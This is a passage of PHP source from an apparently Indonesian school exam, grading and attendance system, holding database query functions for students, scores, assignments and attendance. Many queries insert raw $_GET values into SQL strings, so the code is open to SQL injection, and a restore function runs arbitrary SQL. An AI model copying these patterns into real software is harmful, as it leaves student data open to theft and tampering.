        foreach ($array as $value2) {
          $idsiswa2 = $value2['id_siswa'];
          //$sql3="SELECT * from nilai_pindah where nilai_pindah.id_siswa='$idsiswa2' and nilai_pindah.id_mapel='$ujian'";
          $sql3="SELECT * from nilai_pindah where nilai_pindah.id_siswa='$idsiswa2' and nilai_pindah.KodeMataPelajaran='$ujian'";
          $log3=$this->con->query($sql3) or die($this->con->error);
          $total3 = mysqli_num_rows($log3);
          if($total3 > 0){ }
          else{
            $array4[] = array(
              'username' =>$value2['username'],
              'id_siswa' =>$value2['id_siswa'],
              'nama_siswa' =>$value2['nama_siswa'],
              'kelas' => $value2['kelas'],
              'jurusan' =>$value2['jurusan'],
              'sesi' =>$value2['sesi'],
              'ruang' =>$value2['ruang'],
              'server' =>$value2['server'],
              'agama' =>$value2['agama'],
              'paket' =>$value2['paket'],
              'statusSiswa' =>$value2['statusSiswa'],
              'status' =>1
            );
          }
        }
      }
      // $gabung_array = array_merge($array,$array3);
      $json = json_encode($array4);
      echo $json;
    }
    //cek siswa tidak ujian / belum ujian berdasarkan bank soal
    function siswa_tidak_ujian_banksoal($kls,$jrs,$ujian=null){
      
      $sqlBankSoal="SELECT soalPaket FROM mapel WHERE id_mapel=$ujian";
      $logBankSoal=$this->con->query($sqlBankSoal) or die($this->con->error);
      $dataBankSoal=mysqli_fetch_array($logBankSoal);
      $getDataBankSoal = $dataBankSoal['soalPaket'];

       if($ujian==null){
        return false;
      }
      else{
        if(!empty($kls)){
          //get data siswa berdasrkan id kelas
          $sql="SELECT * from siswa where id_kelas='$kls' AND soalPaket='$getDataBankSoal' ";
        }
        else{
          //get data siswa berdasarkan id jurusan
          $sql="SELECT * from siswa where idpk='$jrs' AND soalPaket='$getDataBankSoal' ";
        }
        
        $log=$this->con->query($sql) or die($this->con->error);   
        $array = [];  
        //cek peserta tidak ujian di tabel nilai atau sedang ujain
        foreach ($log as $value) {
          $idsiswa = $value['id_siswa'];
          //$sql2="SELECT * from nilai where nilai.id_siswa='$idsiswa' and nilai.id_mapel='$ujian'";
          $sql2="SELECT * from nilai where nilai.id_siswa='$idsiswa' and nilai.id_mapel='$ujian'";
          $log2=$this->con->query($sql2) or die($this->con->error);
          $total = mysqli_num_rows($log2);
          if($total > 0){ }
          else{
            if($value['status_siswa']==1){ $statusSiswa = "AKTIF"; }else{ $statusSiswa="OFF"; }
            $array[] = array(
              'username' =>$value['username'],
              'id_siswa' =>$value['id_siswa'],
              'nama_siswa' =>$value['nama'],
              'kelas' => $value['id_kelas'],
              'jurusan' =>$value['idpk'],
              'sesi' =>$value['sesi'],
              'ruang' =>$value['ruang'],
              'server' =>$value['server'],
              'agama' => strtoupper($value['agama']),
              'paket' =>$value['soalPaket'],
              'statusSiswa' =>$statusSiswa,
              'status' =>1
            );
          }
          

        }
        
        //cek peserta tidak ujian di tabel nilai_pindah atau sedang ujain
        foreach ($array as $value2) {
          $idsiswa2 = $value2['id_siswa'];
          //$sql3="SELECT * from nilai_pindah where nilai_pindah.id_siswa='$idsiswa2' and nilai_pindah.id_mapel='$ujian'";
          $sql3="SELECT * from nilai_pindah where nilai_pindah.id_siswa='$idsiswa2' and nilai_pindah.id_mapel='$ujian'";
          $log3=$this->con->query($sql3) or die($this->con->error);
          $total3 = mysqli_num_rows($log3);
          if($total3 > 0){ }
          else{
            $array4[] = array(
              'username' =>$value2['username'],
              'id_siswa' =>$value2['id_siswa'],
              'nama_siswa' =>$value2['nama_siswa'],
              'kelas' => $value2['kelas'],
              'jurusan' =>$value2['jurusan'],
              'sesi' =>$value2['sesi'],
              'ruang' =>$value2['ruang'],
              'server' =>$value2['server'],
              'agama' =>$value2['agama'],
              'paket' =>$value2['paket'],
              'statusSiswa' =>$value2['statusSiswa'],
              'status' =>1
            );
          }
        }
      }
      // $gabung_array = array_merge($array,$array3);
      $json = json_encode($array4);
      echo $json;
      
    }

//&status2 fucntion status2.php
    function lamaujian($seconds)
    {

      if ($seconds) {
        $gmdate = gmdate("z:H:i:s", $seconds);
        $data = explode(":", $gmdate);

        $string = isset($data[0]) && $data[0] > 0 ? $data[0] . " Hari" : "";
        $string .= isset($data[1]) && $data[1] > 0 ? $data[1] . " Jam " : "";
        $string .= isset($data[2]) && $data[2] > 0 ? $data[2] . " Menit " : "";
        // $string .= isset($data[3]) && $data[3] > 0 ? $data[3] . " Detik " : "";
      } else {
        $string = '--';
      }
      return $string;
    }

    function up_tombol_selesai($id_siswa,$id_mapel){
       $sql="UPDATE nilai SET cek_tombol_selesai=1 where id_siswa='$id_siswa' and id_mapel='$id_mapel'";
       $log=$this->con->query($sql) or die($this->con->error);
      return  $log;
    }
//$semuanilai.php -----------------------------------------------------------------------------------------------
    function getMatapelajaranBerdasarkanNilai(){
      $sql ="SELECT DISTINCT KodeMapel,nama_mapel,kode_ujian FROM mapel a
      INNER JOIN mata_pelajaran ON KodeMapel=kode_mapel
      INNER JOIN $this->tabel_nilai_pindah b ON a.id_mapel=b.id_mapel";
      
      $log=$this->con->query($sql) or die($this->con->error);
      return $log;
    }
    function getBankSoalGroupBy(){

      $sql ="SELECT * FROM mapel a INNER JOIN $this->tabel_nilai_pindah b ON a.id_mapel=b.id_mapel 
      GROUP BY b.KodeMataPelajaran";
      $log=$this->con->query($sql) or die($this->con->error);
      return $log;
    }
    function getNilaiSiswa($idsiswa,$kodematapelajaran){
      $sql ="SELECT nilaiPaketSoal,jml_benar,jml_salah,skor FROM $this->tabel_nilai_pindah WHERE id_siswa=$idsiswa AND KodeMataPelajaran='$kodematapelajaran' ";
      $log=$this->con->query($sql) or die($this->con->error);
      $data=$log->fetch_array();
      return $data;
    }
//&nilai function  Nilai2.php -------------------------------------------------------------------------------------

    function Tampil_nilai2(){ //tampil siswa
      $tabel='nilai_pindah';
      $id_jrs = $_GET['jrs'];
      $id_kls = $_GET['kelas'];
      $id_mapel = $_GET['id'];
      if(empty($id_jrs)){
        $sql = "SELECT * FROM siswa a join $tabel b on a.id_siswa=b.id_siswa WHERE id_kelas='$id_kls' and id_ujian='$id_mapel'";
      }
      elseif(empty($id_kls)){
        $sql = "SELECT * FROM siswa a JOIN $tabel b ON a.id_siswa=b.id_siswa WHERE idpk='$id_jrs' AND id_ujian='$id_mapel'";
      }
      else{
        $sql = "SELECT * FROM siswa a join $tabel b on a.id_siswa=b.id_siswa";
      }
      $log=$this->con->query($sql) or die($this->con->error);
        return  $log; 
    }
    function Tampil_nilai_per_mapel(){
      $sql ="SELECT nama,id_mapel,id_ujian,jml_esai FROM ujian";
      $log=$this->con->query($sql) or die($this->con->error);
      return $log;
    }
    function Tampil_nilai_per_mata_pelajaran(){
      $sql ="SELECT nama_mapel,KodeMapel FROM ujian a
      INNER JOIN mapel b ON a.id_mapel = b.id_mapel
      INNER JOIN mata_pelajaran c ON b.KodeMapel = c.kode_mapel
      GROUP BY KodeMapel ";
      $log=$this->con->query($sql) or die($this->con->error);
      return $log;
    }

    function Tampil_nilai3($id_siswa){ //tampil siswa beserta nilai benar salah
      $tabel='nilai_pindah';
      $id_jrs = $_GET['jrs'];
      $id_kls = $_GET['kelas'];
      $id_mapel = $_GET['id'];
      if(empty($id_jrs)){
        $sql ="SELECT * FROM $tabel a JOIN siswa b ON b.id_siswa=a.id_siswa JOIN kelas c ON b.id_kelas = c.id_kelas WHERE b.id_kelas='$id_kls' and id_ujian='$id_mapel' and b.id_siswa='$id_siswa'";
      }
      elseif(empty($id_kls)){
        $sql ="SELECT * FROM $tabel a JOIN siswa b ON b.id_siswa=a.id_siswa JOIN kelas c ON b.id_kelas = c.id_kelas WHERE b.idpk='$id_jrs' and id_ujian='$id_mapel' and b.id_siswa='$id_siswa'";
      }
      else{

      }
       $log=$this->con->query($sql) or die($this->con->error);
        return  $log;
    }
//&esai -------------------------
    function v_nilai_esai($id){
     $sql ="SELECT * FROM soal WHERE id_soal='$id'";
     $log=$this->con->query($sql) or die($this->con->error);
     $data=$log->fetch_array();
      return  $data;
    }
//&berita_acara -------------------------
    function berita_acara(){
     $sql ="SELECT * FROM ujian";
     $log=$this->con->query($sql) or die($this->con->error);
     return $log;
    }
    function berita_acara_by_sesi(){
     $sql ="SELECT * FROM ujian group by sesi";
     $log=$this->con->query($sql) or die($this->con->error);
     return $log;
    }
//&nilai_copy ------------------------------
    function v_nilai_copy(){
      $id_jrs = $_GET['jrs'];
      $id_kls = $_GET['kls'];
      $id_mapel = $_GET['id_mapel'];

      if(empty($id_jrs)){
        $where = " WHERE siswa.id_kelas='$id_kls' and ujian.id_mapel='$id_mapel' ";
      }
      elseif(empty($id_kls)){
        $where = " WHERE siswa.idpk='$id_jrs' and ujian.id_mapel='$id_mapel' ";
      }
      else{
        $where="";
      }
      $sql ="
      SELECT siswa.id_siswa,siswa.nis,ujian.id_ujian,ujian.id_mapel,siswa.nama AS nama_siswa,ujian.nama 
      FROM siswa
      INNER JOIN jawaban_copy ON jawaban_copy.id_siswa = siswa.id_siswa
      INNER JOIN ujian ON ujian.id_ujian = jawaban_copy.id_ujian
      $where
      GROUP BY siswa.id_siswa,jawaban_copy.id_ujian";
      $log=$this->con->query($sql) or die($this->con->error);
      return $log;

    } 
    //get soal jawaban_copy----------
    function select_soal($idmapel){
    $where =" WHERE id_mapel='$idmapel' and jenis=1 ";
    $sql ="SELECT id_soal,nomor,jawaban,id_mapel,jenis FROM soal $where ";
    $log=$this->con->query($sql) or die($this->con->error);
      foreach ($log as $value) {
        $data[]=$value;
      }
    return $data;
    }
    function select_soal2($idmapel){
    $where =" WHERE id_mapel='$idmapel' and jenis=2 ";
    $sql ="SELECT id_soal,nomor,jawaban,id_mapel,jenis FROM soal $where ";
    $log=$this->con->query($sql) or die($this->con->error);
      foreach ($log as $value) {
        $data[]=$value;
      }
    return $data;
    }
    function select_jawaban_copy($data){
      extract($data);
      $sql ="SELECT * FROM jawaban_copy 
      WHERE id_ujian='$id_ujian'
      AND  id_mapel='$id_mapel' 
      AND  id_siswa ='$id_siswa' 
      AND id_soal='$id_soal' 
      AND jenis='1' ";
      $log=$this->con->query($sql) or die($this->con->error);
      $data=$log->fetch_array();
      return  $data;
    }
    function select_jawaban_copy2($data){
      extract($data);
      $sql ="SELECT * FROM jawaban_copy 
      WHERE id_ujian='$id_ujian'
      AND  id_mapel='$id_mapel' 
      AND  id_siswa ='$id_siswa' 
      AND id_soal='$id_soal' 
      AND jenis='2' ";
      $log=$this->con->query($sql) or die($this->con->error);
      $data=$log->fetch_array();
      return  $data;
    }
    //get soal jawaban_copy----------

    // random token 
    function create_random_token($length)
    {
      $data = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
      $string = '';
      for ($i = 0; $i < $length; $i++) {
        $pos = rand(0, strlen($data) - 1);
        $string .= $data[$pos];
      }
      return $string;
      
      
    }

//restore database
    function restore($data){
      $log=$this->con->query($data) or die($this->con->error);
      if($log==true){
        return 1;
      }
      else{
        return 0;
      }
    }
//&materi2
  function edit_materi2($id){
    $sql ="SELECT * FROM materi2 INNER JOIN mata_pelajaran ON materi2.materi2_mapel=mata_pelajaran.kode_mapel WHERE materi2_id = $id";
     $log=$this->con->query($sql) or die($this->con->error);
     return $log;
  }
  function cari_data_byid($table,$where=null){
      $command = 'SELECT * FROM '.$table;
      if($where!=null) {
        $value = null;
        foreach($where as $f => $v) {
          $value .= "#".$f."='".$v."'";
        }
        $command .= ' WHERE '.substr($value,1);
        $command = str_replace('#',' AND ',$command);
      }
      $sql = $this->con->query($command) or die($this->con->error);
      
      foreach ($sql as $value) {
        $array[] = array(
          'kode_mapel' =>$value['kode_mapel'],
          'nama_mapel' => $value['nama_mapel'],
        );
      }
      $myJSON = json_encode($array);
      echo $myJSON;
  }
  function CariDataById($table,$where=null){
    $command = 'SELECT * FROM '.$table;
      if($where!=null) {
        $value = null;
        foreach($where as $f => $v) {
          $value .= "#".$f."='".$v."'";
        }
        $command .= ' WHERE '.substr($value,1);
        $command = str_replace('#',' AND ',$command);
      }
      $sql = $this->con->query($command) or die($this->con->error);
      return $sql;
  }
  function hitungViewMateri2($id){
    $sql="SELECT COUNT(mtrViewIdMateri) AS jumlah FROM materi_view WHERE mtrViewIdMateri=$id";
    $log=$this->con->query($sql) or die($this->con->error);
    $data=mysqli_fetch_array($log);
    return $data;
  }
  function listViewMateri2($id){
     $sql ="SELECT nama,materi2_judul,mtrViewJenis,mtrViewDate FROM materi_view INNER JOIN siswa ON siswa.id_siswa=materi_view.mtrViewIdSiswa INNER JOIN materi2 ON materi2.materi2_id=materi_view.mtrViewIdMateri WHERE mtrViewIdMateri=$id ORDER BY mtrViewDate DESC";
     $log=$this->con->query($sql) or die($this->con->error);
     return $log;
  }
//&tugassiswa
  function edit_tugas($id){
    $sql ="SELECT * FROM tugas WHERE id_tugas = $id";
     $log=$this->con->query($sql) or die($this->con->error);
     return $log;
  }
  function getHasilTugas($id)
  {
    echo $batas;
     $sql3 ="SELECT * FROM tugas WHERE id_tugas = $id";
     $log3=$this->con->query($sql3) or die($this->con->error);
     foreach ($log3 as $tgs) {
      $tugas = $tgs;
     }

     $sql ="SELECT * FROM jawaban_tugas WHERE id_tugas = $id";
     $log=$this->con->query($sql) or die($this->con->error);
      foreach ($log as $jwb) {
        $sql2 ="SELECT * FROM siswa WHERE id_siswa = $jwb[id_siswa]";
        $log2=$this->con->query($sql2) or die($this->con->error);
        foreach ($log2 as $siswa) {
          $data = array(
            'namasiswa' =>$siswa['nama'],
            'mapel' =>$tugas['mapel'],
            'judultugas' =>$tugas['judul'],
            'kelas' =>$tugas['kelas'],
            'nilai' =>$jwb['nilai'],
          );
          $data2[]=$data;
        }
      }
      return $data2;
     
  }
  function getHasilTugas2($id,$batas,$batasakhir)
  {
     $sql3 ="SELECT * FROM tugas WHERE id_tugas = $id";
     $log3=$this->con->query($sql3) or die($this->con->error);
     foreach ($log3 as $tgs) {
      $tugas = $tgs;
     }

     $sql ="SELECT * FROM jawaban_tugas WHERE id_tugas = $id limit $batas,$batasakhir";
     $log=$this->con->query($sql) or die($this->con->error);
      foreach ($log as $jwb) {
        $sql2 ="SELECT * FROM siswa WHERE id_siswa = $jwb[id_siswa]";
        $log2=$this->con->query($sql2) or die($this->con->error);
        foreach ($log2 as $siswa) {
          $data = array(
            'namasiswa' =>$siswa['nama'],
            'mapel' =>$tugas['mapel'],
            'judultugas' =>$tugas['judul'],
            'kelas' =>$tugas['kelas'],
            'nilai' =>$jwb['nilai'],
          );
          $data2[]=$data;
        }
      }
      return $data2;
     
  }
  function getTugas($id=null)
  {
    if($id==null){
      $sql ="SELECT * FROM tugas";
    }
    else{
      $sql ="SELECT * FROM tugas WHERE id_tugas = $id";
    }
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
  }
//&mata_pelajara ------------------------------
  function getMata_pelajaran_by_level($id)
  {
    $sql="SELECT * FROM mata_pelajaran WHERE kode_level='$id'";
    $log=$this->con->query($sql) or die($this->con->error);
    foreach ($log as $value) {
      $data2[]=$value;
    }
    $json = json_encode($data2);
    echo $json;
  }
  function getMata_pelajaran($id=null){
    if(!empty($id)){
      $sql="SELECT * FROM mata_pelajaran WHERE idmapel='$id'";
    }
    else{
      $sql="SELECT * FROM mata_pelajaran";
    }
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
  }

//&absensi-----------------------------------------------------
  function getTahun()
  {
    $sql ="SELECT *  FROM tahun WHERE thAktif=1";
     $log=$this->con->query($sql) or die($this->con->error);
     return $log;
  }
  function getTahun2()
  {
    $sql ="SELECT *  FROM tahun";
     $log=$this->con->query($sql) or die($this->con->error);
     return $log;
  }
  function getBulan()
  {
    $sql ="SELECT DISTINCT MONTH(absTgl) AS bulan FROM absensi";
     $log=$this->con->query($sql) or die($this->con->error);
     return $log;
  }
  function getJamSkl()
  {
     $sql ="SELECT * FROM jam_skl";
     $log=$this->con->query($sql) or die($this->con->error);
     $data=$log->fetch_array();
     return $data;
  }
  function getJamMapel($id)
  {
     $sql ="SELECT * FROM absensi_mapel where amId='$id'";
     $log=$this->con->query($sql) or die($this->con->error);
     $data=$log->fetch_array();
     return $data;
  }
  function getAbsen()
  {
    $tahun=$_GET['tahun'];
    $bulan=$_GET['bulan'];
    $kelas=$_GET['kelas'];
    $idsiswa='';
    if(!empty($idsiswa)){
      //echo"asdasd";
    }
    else{

       $sql ="SELECT DISTINCT absIdsiswa,siswa.nama as namasiswa,kelas.nama,
        SUM(CASE WHEN absStatus='H' THEN 1 ELSE 0 END) AS hadir,
        SUM(CASE WHEN absStatus='A' THEN 1 ELSE 0 END) AS alpa,
        SUM(CASE WHEN absStatus='B' THEN 1 ELSE 0 END) AS bolos,
        SUM(CASE WHEN absStatus='I' THEN 1 ELSE 0 END) AS izin,
        SUM(CASE WHEN absStatus='S' THEN 1 ELSE 0 END) AS sakit,
        SUM(CASE WHEN absStatus='T' THEN 1 ELSE 0 END) AS terlambat
        FROM absensi
        INNER JOIN siswa ON siswa.id_siswa=absensi.absIdSiswa
        INNER JOIN kelas ON kelas.idkls=absensi.absIdKelas
        WHERE MONTH(absTgl)='$bulan' AND YEAR(absTgl)='$tahun' AND absIdKelas='$kelas'
        GROUP BY absIdSiswa
        ORDER BY siswa.nama ASC";
       $log=$this->con->query($sql) or die($this->con->error);
       return $log;
    }
  }
  function getAbsen2($batas,$batasakhir)
  {
    $tahun=$_GET['tahun'];
    $bulan=$_GET['bulan'];
    $kelas=$_GET['kelas'];
    $idsiswa='';
    if(!empty($idsiswa)){
      //echo"asdasd";
    }
    else{

       $sql ="SELECT DISTINCT absIdsiswa,siswa.nama as namasiswa,kelas.nama,
        SUM(CASE WHEN absStatus='H' THEN 1 ELSE 0 END) AS hadir,
        SUM(CASE WHEN absStatus='A' THEN 1 ELSE 0 END) AS alpa,
        SUM(CASE WHEN absStatus='B' THEN 1 ELSE 0 END) AS bolos,
        SUM(CASE WHEN absStatus='I' THEN 1 ELSE 0 END) AS izin,
        SUM(CASE WHEN absStatus='S' THEN 1 ELSE 0 END) AS sakit,
        SUM(CASE WHEN absStatus='T' THEN 1 ELSE 0 END) AS terlambat
        FROM absensi
        INNER JOIN siswa ON siswa.id_siswa=absensi.absIdSiswa
        INNER JOIN kelas ON kelas.idkls=absensi.absIdKelas
        WHERE MONTH(absTgl)='$bulan' AND YEAR(absTgl)='$tahun' AND absIdKelas='$kelas'
        GROUP BY absIdSiswa
        ORDER BY siswa.nama ASC
        limit $batas,$batasakhir
        ";
       $log=$this->con->query($sql) or die($this->con->error);
       return $log;
    }
  }
  function getAbsenDetail()
  {
    @$tahun=$_GET['tahun'];
    @$bulan=$_GET['bulan'];
    @$tgl=$_GET['tgl'];
    @$kelas=$_GET['kelas'];
    @$idsiswa=$_GET['siswa'];
    if($idsiswa !='null' && $tgl !='null' ){
      $where = ' AND absIdSiswa='.$idsiswa.' AND DAY(absTgl)='.$tgl;
    }
    elseif($idsiswa !='null' && $tgl=='null'){
      $where = ' AND absIdSiswa='.$idsiswa;
    }
    
    elseif($idsiswa =='null' && $tgl!='null'){
      $where = ' AND DAY(absTgl)='.$tgl;
      
    }
   
    else{
      //$where=''; 
    }


    if(!empty($tahun)){
      $sql ="SELECT absId,absFoto,absUrlFoto,absIdSiswa,absTgl,absJamIn,absJamOut,absStatus,siswa.nama AS namasiswa,kelas.nama 
       FROM absensi 
       INNER JOIN siswa ON siswa.id_siswa=absensi.absIdSiswa
       INNER JOIN kelas ON kelas.idkls=absensi.absIdKelas 
       WHERE MONTH(absTgl)=$bulan AND YEAR(absTgl)=$tahun AND absIdKelas=$kelas $where";
   
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
    }  
  }
  function getAbsenDetail2($batas,$batasakhir)
  {
    @$tahun=$_GET['tahun'];
    @$bulan=$_GET['bulan'];
    @$tgl=$_GET['tgl'];
    @$kelas=$_GET['kelas'];
    @$idsiswa=$_GET['siswa'];
    if($idsiswa !='null' && $tgl !='null' ){
      $where = ' AND absIdSiswa='.$idsiswa.' AND DAY(absTgl)='.$tgl;
    }
    elseif($idsiswa !='null' && $tgl=='null'){
      $where = ' AND absIdSiswa='.$idsiswa;
    }
    
    elseif($idsiswa =='null' && $tgl!='null'){
      $where = ' AND DAY(absTgl)='.$tgl;
      
    }
   
    else{
      //$where=''; 
    }
    
    if(!empty($tahun)){
      $sql ="SELECT absId,absFoto,absUrlFoto,absIdSiswa,absTgl,absJamIn,absJamOut,absStatus,siswa.nama AS namasiswa,kelas.nama 
       FROM absensi 
       INNER JOIN siswa ON siswa.id_siswa=absensi.absIdSiswa
       INNER JOIN kelas ON kelas.idkls=absensi.absIdKelas 
       WHERE MONTH(absTgl)=$bulan AND YEAR(absTgl)=$tahun AND absIdKelas=$kelas $where
       ORDER BY siswa.nama ASC
       limit $batas,$batasakhir
       ";
   
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
    }  
  }
  
  function getKelasId($id){
     $sql ="SELECT * FROM kelas WHERE idkls='$id'";
     $log=$this->con->query($sql) or die($this->con->error);
     return $log;
  }
//&absensi_mapel------------------------
  function getMapelAbsen($id=null)
  {
    if(!empty($id)){
      $where = ' AND amId='.$id;
    }
    if($this->level() == 'admin'){
      $sql ="SELECT * FROM absensi_mapel 
      INNER JOIN kelas ON kelas.idkls=absensi_mapel.amKelas
      INNER JOIN pengawas ON pengawas.id_pengawas=absensi_mapel.amIdGuru
      ";
    }
    else{
      $idguru = $this->guru();
      $sql ="SELECT * FROM absensi_mapel 
      INNER JOIN kelas ON kelas.idkls=absensi_mapel.amKelas
      INNER JOIN pengawas ON pengawas.id_pengawas=absensi_mapel.amIdGuru
      WHERE amIdGuru=$idguru
      $where
      ";
    }
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
  }
  function get_absen_mapel_by_id($idguru=null){
    if($this->level() == 'admin'){
      // $sql ="SELECT * FROM absensi_mapel
      // INNER JOIN mata_pelajaran ON absensi_mapel.amIdMapel = mata_pelajaran.idmapel
      // INNER JOIN kelas ON absensi_mapel.amKelas = kelas.idkls
      // ";
       $sql ="SELECT DISTINCT * FROM absensi_mapel
      INNER JOIN mata_pelajaran ON absensi_mapel.amIdMapel = mata_pelajaran.idmapel
      INNER JOIN kelas ON absensi_mapel.amKelas = kelas.idkls
      GROUP BY amIdMapel,amIdGuru";
    }
    else{
      $idguru = $this->guru();
      // $sql ="SELECT * FROM absensi_mapel
      // INNER JOIN mata_pelajaran ON absensi_mapel.amIdMapel = mata_pelajaran.idmapel
      // INNER JOIN kelas ON absensi_mapel.amKelas = kelas.idkls
      // WHERE amIdGuru= $idguru
      // ";
      $sql ="SELECT DISTINCT * FROM absensi_mapel
      INNER JOIN mata_pelajaran ON absensi_mapel.amIdMapel = mata_pelajaran.idmapel
      INNER JOIN kelas ON absensi_mapel.amKelas = kelas.idkls
      WHERE amIdGuru= $idguru
      GROUP BY amIdMapel,amIdGuru";
    }
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
  }
  function get_absen_mapel_by_id_manual($idguru=null){
    if($this->level() == 'admin'){
       $sql ="SELECT DISTINCT * FROM absensi_mapel
      INNER JOIN mata_pelajaran ON absensi_mapel.amIdMapel = mata_pelajaran.idmapel
      INNER JOIN kelas ON absensi_mapel.amKelas = kelas.idkls
      GROUP BY amIdMapel,amIdGuru";
    }
    else{
      $idguru = $this->guru();
      $sql ="SELECT * FROM absensi_mapel
      INNER JOIN mata_pelajaran ON absensi_mapel.amIdMapel = mata_pelajaran.idmapel
      INNER JOIN kelas ON absensi_mapel.amKelas = kelas.idkls
      WHERE amIdGuru= $idguru";
    }
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
  }

  function get_absen_siswa_mapel(){
    $tahun = $_GET['tahun'];
    $bulan = $_GET['bulan'];
    $mapel = $_GET['mapel'];
    $kelas = $_GET['kelas'];
    $tgl = @$_GET['tgl'];
    if(!empty($tgl)){
      if($tgl=='all'){ $where =''; }else{ $where = ' AND DAY(amaTgl)='.$tgl; }
       
    }
    if(!empty($tahun)){
      $sql ="SELECT * FROM absensi_mapel_anggota 
      INNER JOIN siswa ON siswa.id_siswa=absensi_mapel_anggota.amaIdSiswa
      INNER JOIN absensi_mapel ON absensi_mapel.amId=absensi_mapel_anggota.amaIdAbsenMapel
      /*WHERE amaIdMapel=$mapel*/
      WHERE amaIdAbsenMapel=$mapel
      AND amaIdKelas=$kelas
      AND YEAR(amaTgl)=$tahun
      AND MONTH(amaTgl)=$bulan
      $where
      ";
        $log=$this->con->query($sql) or die($this->con->error);
        return $log;
    }
    
    
  }

  
   
  function get_absen_siswa_mapel3(){
    @$tahun=$_GET['tahun'];
    @$bulan=$_GET['bulan'];
    @$mapel=$_GET['mapel'];
    @$kelas=$_GET['kelas'];
     $sql ="SELECT amaIdSiswa,nama,id_kelas,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=1,amaStatus,NULL))) AS tgl1,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=2,amaStatus,NULL))) AS tgl2,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=3,amaStatus,NULL))) AS tgl3,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=4,amaStatus,NULL))) AS tgl4,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=5,amaStatus,NULL))) AS tgl5,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=6,amaStatus,NULL))) AS tgl6,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=7,amaStatus,NULL))) AS tgl7,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=8,amaStatus,NULL))) AS tgl8,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=9,amaStatus,NULL))) AS tgl9,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=10,amaStatus,NULL))) AS tgl10,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=11,amaStatus,NULL))) AS tgl11,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=12,amaStatus,NULL))) AS tgl12,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=13,amaStatus,NULL))) AS tgl13,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=14,amaStatus,NULL))) AS tgl14,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=15,amaStatus,NULL))) AS tgl15,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=16,amaStatus,NULL))) AS tgl16,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=17,amaStatus,NULL))) AS tgl17,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=18,amaStatus,NULL))) AS tgl18,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=19,amaStatus,NULL))) AS tgl19,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=20,amaStatus,NULL))) AS tgl20,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=21,amaStatus,NULL))) AS tgl21,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=22,amaStatus,NULL))) AS tgl22,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=23,amaStatus,NULL))) AS tgl23,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=24,amaStatus,NULL))) AS tgl24,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=25,amaStatus,NULL))) AS tgl25,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=26,amaStatus,NULL))) AS tgl26,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=27,amaStatus,NULL))) AS tgl27,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=28,amaStatus,NULL))) AS tgl28,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=29,amaStatus,NULL))) AS tgl29,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=30,amaStatus,NULL))) AS tgl30,
      GROUP_CONCAT( DISTINCT CONCAT(IF(DAY(amaTgl)=31,amaStatus,NULL))) AS tgl31,
      SUM(CASE WHEN amaStatus='H' THEN 1 ELSE 0 END) AS hadir,
      SUM(CASE WHEN amaStatus='A' THEN 1 ELSE 0 END) AS alpha,
      SUM(CASE WHEN amaStatus='B' THEN 1 ELSE 0 END) AS bolos,
      SUM(CASE WHEN amaStatus='I' THEN 1 ELSE 0 END) AS izin,
      SUM(CASE WHEN amaStatus='T' THEN 1 ELSE 0 END) AS telat,
      SUM(CASE WHEN amaStatus='S' THEN 1 ELSE 0 END) AS sakit
      FROM absensi_mapel_anggota
      INNER JOIN siswa ON siswa.id_siswa=absensi_mapel_anggota.amaIdSiswa
      WHERE YEAR(amaTgl)=$tahun AND MONTH(amaTgl)=$bulan 
      -- AND amaIdMapel=$mapel--
      AND amaIdAbsenMapel=$mapel
      AND amaIdKelas=$kelas
      GROUP BY amaIdSiswa";
      // AND amaIdKelas=$kelas 
     $log=$this->con->query($sql) or die($this->con->error);
     return $log;
  }
//Pengumuman --------------------------------
  function getPengumumanGuru(){
    $idguru =$this->guru();
    $sql ="SELECT * FROM pengumuman INNER JOIN pengawas ON pengawas.id_pengawas=pengumuman.user
    WHERE pengumuman.user=$idguru ORDER BY date DESC ";
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
  }
  function getDashborPengumumanGuru(){
    $sql ="SELECT * FROM pengumuman INNER JOIN pengawas ON pengawas.id_pengawas=pengumuman.user
